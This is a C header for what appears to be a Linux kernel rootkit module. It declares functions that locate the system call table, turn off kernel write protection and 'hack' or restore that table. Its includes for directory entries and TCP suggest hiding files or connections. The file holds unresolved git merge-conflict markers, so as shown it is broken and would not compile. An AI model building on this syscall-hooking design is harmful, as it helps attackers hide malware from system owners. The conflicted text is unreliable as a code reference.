#ifndef __SYSCALLTABLE__
#define __SYSCALLTABLE__

#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/fs_struct.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/errno.h>
#include <linux/list.h>
#include <net/tcp.h>
#include <linux/in.h>
#include <linux/module.h> /* module_init module_exit */
#include <linux/init.h> /* __init __exit */
#include <linux/syscalls.h> /* sys_close __NR_close __NR_mkdir */
#include <linux/delay.h> /* loops_per_jiffy */
#include <asm/bitops.h> /* set_bit clear_bit */
#include "config.h"
<<<<<<< HEAD
#include "util.h"
#include "cmd.h"
#include "list.h"
=======

>>>>>>> 884f7fbed93b1f333a0ad3295fe448314d32affa

unsigned int find_do_fork(void);
extern unsigned long **sys_call_table;
void disable_write_protection(void);
void enable_write_protection(void);
unsigned long **find_sys_call_table(void);
<<<<<<< HEAD
long prehack_sys_call_table(void);
=======
void backup_sys_call_table(void);
>>>>>>> 884f7fbed93b1f333a0ad3295fe448314d32affa
void hack_sys_call_talbe(void);
void unhack_sys_call_talbe(void);

#endif